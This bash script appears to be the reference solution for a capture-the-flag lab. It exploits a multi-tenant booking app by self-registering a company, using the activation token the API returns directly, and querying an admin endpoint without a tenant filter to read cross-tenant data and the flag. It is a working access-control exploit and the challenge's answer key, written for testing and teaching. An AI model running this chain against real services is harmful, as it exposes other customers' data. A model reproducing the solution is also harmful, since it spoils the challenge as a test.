#!/usr/bin/env bash
# ============================================================
# BookerTenant (labs25) - reference solution: self-registered
# admin account -> missing tenant fallback on admin collections
#
# Chain: self-register company -> activation token is returned
# directly -> activate company -> use admin token -> omit the
# company filter on /adminapi/guest-list -> read cross-tenant data.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8105)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8105}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] self-registering a company through the admin API" >&2
REG="$(curl -fsS -X POST "$BASE/adminapi/company/register" \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"arena-player\",\"email\":\"$email\",\"phone\":\"+628123456789\",\"password\":\"test12345\",\"repeat_password\":\"test12345\",\"lang\":\"en\",\"agree\":1}")"

COMPANY_ID="$(python3 -c 'import sys,json; print(json.load(sys.stdin)["data"]["company_id"])' <<<"$REG")"
ACTIVATION_TOKEN="$(python3 -c 'import sys,json; print(json.load(sys.stdin)["data"]["activation_token"])' <<<"$REG")"
[[ -n "$COMPANY_ID" && -n "$ACTIVATION_TOKEN" ]] || { echo "[-] failed: registration returned no activation material" >&2; exit 1; }

echo "[*] activating the company and collecting the admin bearer token" >&2
ACT="$(curl -fsS -X PUT "$BASE/adminapi/company/register/$COMPANY_ID/$ACTIVATION_TOKEN")"
TOKEN="$(python3 -c 'import sys,json; print(json.load(sys.stdin)["data"]["access_token"])' <<<"$ACT")"
[[ -n "$TOKEN" ]] || { echo "[-] failed: activation returned no token" >&2; exit 1; }

echo "[*] querying /adminapi/guest-list without a company filter" >&2
LEAK="$(curl -fsS "$BASE/adminapi/guest-list?first_name=Flag&limit=10" \
  -H "Authorization: Bearer $TOKEN" -H 'Accept: application/json')"
flag="$(grep -Eo "$FLAG_RE" <<<"$LEAK" | head -n1 || true)"

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: no flag in cross-tenant guest response" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
